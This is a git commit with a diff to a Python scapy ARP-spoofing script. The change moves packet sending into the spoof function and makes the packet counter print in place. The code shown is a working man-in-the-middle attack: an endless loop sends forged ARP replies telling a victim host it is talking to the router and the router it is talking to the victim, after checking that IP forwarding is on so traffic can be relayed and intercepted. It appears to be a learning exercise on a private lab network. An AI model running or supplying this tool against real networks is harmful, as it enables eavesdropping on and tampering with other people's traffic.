4cba53771b2a3b34132597a61153e11efde83ee3
hostuser <hostuser@hostuser.hostuser>
2022-06-27 22:21:16 +1000

    Adding dinamic printing

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -22,16 +22,17 @@ def spoof(target_ip, spoof_ip):
     # psrc -> ip to simulate
     # For more info print(packet.show())
     # For more info print(packet.summary())
-    return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
+    scapy.send(packet, verbose=False)
 
 
 if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 1:
     sent_packets_count = 0
     while True:
-        scapy.send(spoof("192.168.180.9", "192.168.180.100"))  # telling the victim we're the router
-        scapy.send(spoof("192.168.180.100", "192.168.180.9"))  # telling the router we're the victim
+        spoof("192.168.180.9", "192.168.180.100")  # telling the victim we're the router
+        spoof("192.168.180.100", "192.168.180.9")  # telling the router we're the victim
         sent_packets_count = sent_packets_count + 2
-        print("[+] Packets sent: " + str(sent_packets_count))
+        print("[+] Packets sent: " + str(sent_packets_count), end='\r')
         time.sleep(2)
 else:
     print("ip_forward is 0, modify it to 1. sysctl -w net.ipv4.ip_forward=1")
